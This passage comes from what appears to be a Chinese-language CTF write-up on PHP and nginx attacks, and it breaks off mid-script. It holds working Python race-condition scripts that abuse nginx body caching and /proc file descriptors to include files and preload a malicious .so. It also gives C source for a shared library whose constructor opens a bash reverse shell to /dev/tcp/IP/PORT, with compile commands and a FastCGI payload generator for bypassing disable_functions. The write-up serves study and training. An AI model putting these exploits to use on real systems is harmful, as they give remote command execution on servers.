class="hljs-string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;length&#125;</span></span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;payload&#125;</span></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode()<br>        s.send(x)<br>        s.close()<br><br><br><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruter</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">40</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fd:&quot;</span>, fd)<br>            s = socket.socket()<br>            s.connect((ip, port))<br>            s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span> HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>            <span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">2048</span>).decode())<br>            s.close()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    t = threading.Thread(target=upload)<br>    t.start()<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    a = threading.Thread(target=bruter)<br>    a.start()<br><br></code></pre></td></tr></table></figure><p><strong>三：nginx的body缓存机制+恶意so文件</strong></p><p>与二类似，只不过将命令换成了so文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br>ip = <span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span><br>port = <span class="hljs-number">28128</span><br>s = socket.socket()<br>s.connect((ip, port))<br><br><span class="hljs-comment"># 获取当前进程的pid</span><br>s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span><br><span class="hljs-string">Host:127.0.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>data = s.recv(<span class="hljs-number">1024</span>).decode()<br>s.close()<br>pid = re.findall(<span class="hljs-string">&#x27;(.*?) www-data&#x27;</span>, data)[<span class="hljs-number">0</span>].strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pid:&quot;</span>, pid)<br><br><span class="hljs-comment"># payload length</span><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.so&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() + <span class="hljs-string">b&#x27;\n&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">200</span>)).encode()<br><br><br><span class="hljs-comment"># 上传文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        s = socket.socket()<br>        s.connect((ip, port))<br>        x = <span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#x27;&#x27;&#x27;</span> + length + <span class="hljs-string">b&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> + <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.so&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() + <span class="hljs-string">b&#x27;\n&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">200</span> + <span class="hljs-string">b&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>        s.send(x)<br>        s.close()<br><br><br><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruter</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">40</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fd:&quot;</span>, fd)<br>            s = socket.socket()<br>            s.connect((ip, port))<br>            s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span> HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>            <span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">2048</span>).decode())<br>            s.close()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    t = threading.Thread(target=upload)<br>    t.start()<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    a = threading.Thread(target=bruter)<br>    a.start()<br></code></pre></td></tr></table></figure><h1 id="加载so绕过disable-functions"><a href="#加载so绕过disable-functions" class="headerlink" title="加载so绕过disable_functions"></a>加载so绕过disable_functions</h1><p>原理与 LD_PRELOAD 绕过的方式差不多，一个是通过 putenv 设置，另一个则是通过上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展来绕过</p><p>制作恶意so文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><p>以下是修改过的 <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a>，可以生成payload，注意修改 PHP_VALUE 的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># 修改点 1</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        <span class="hljs-variable language_">self</span>.host = host<br>        <span class="hljs-variable language_">self</span>.port = port<br>        <span class="hljs-variable language_">self</span>.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        <span class="hljs-variable language_">self</span>.sock.settimeout(<span class="hljs-variable language_">self</span>.timeout)<br>        <span class="hljs-variable language_">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br><br>        <span class="hljs-comment"># 修改点 2</span><br>        <span class="hljs-comment"># try:</span><br>        <span class="hljs-comment">#     self.sock.connect((self.host, int(self.port)))</span><br>        <span class="hljs-comment"># except socket.error as msg:</span><br>        <span class="hljs-comment">#     self.sock.close()</span><br>        <span class="hljs-comment">#     self.sock = None</span><br>        <span class="hljs-comment">#     print(repr(msg))</span><br>        <span class="hljs-comment">#     return False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>              + bchr(fcgi_type) \<br>              + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = <span class="hljs-variable language_">self</span>.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        <span class="hljs-variable language_">self</span>.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(<span class="hljs-variable language_">self</span>.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += <span class="hljs-variable language_">self</span>.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-comment"># 修改点 3</span><br>        <span class="hljs-comment"># self.sock.send(request)</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span><br>        <span class="hljs-comment"># return self.__waitForResponse(requestId)</span><br>        <span class="hljs-keyword">return</span> request<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = <span class="hljs-variable language_">self</span>.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span 